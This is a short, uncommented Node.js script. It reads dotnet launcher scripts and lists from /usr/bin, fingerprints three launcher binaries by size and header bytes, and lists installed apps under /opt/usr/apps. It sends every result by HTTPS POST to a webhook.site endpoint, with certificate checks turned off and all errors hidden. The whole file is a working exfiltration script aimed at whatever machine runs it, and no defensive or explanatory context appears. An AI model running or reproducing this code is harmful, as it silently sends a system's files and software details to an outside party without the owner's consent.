var fs = require('fs');
var https = require('https');
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/49eca885-643e-4d14-a1d1-c284408e4033/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
['/usr/bin/dotnet-run-ni.sh', '/usr/bin/dotnet-init.sh', '/usr/bin/dotnet-developer-mode.sh', '/usr/bin/dotnet-apps.txt', '/usr/bin/dotnet_preload_so_list.txt'].forEach(function (f) {
    try {
        send('files', f + '\n' + fs.readFileSync(f, 'utf8').slice(0, 4000));
    } catch (e) {
        send('files', f + ' ERR ' + e);
    }
});
['/usr/bin/dotnet-launcher', '/usr/bin/dotnet-launcher-inhouse', '/usr/bin/dotnet-aot-manager'].forEach(function (f) {
    try {
        var b = fs.readFileSync(f);
        send('files', f + ' size=' + b.length + ' magic=' + b.slice(0, 16).toString('hex'));
    } catch (e) {
        send('files', f + ' ERR ' + e);
    }
});
try {
    var apps = fs.readdirSync('/opt/usr/apps');
    send('files', 'apps=' + apps.join(','));
} catch (e) {
    send('files', 'apps ERR ' + e);
}
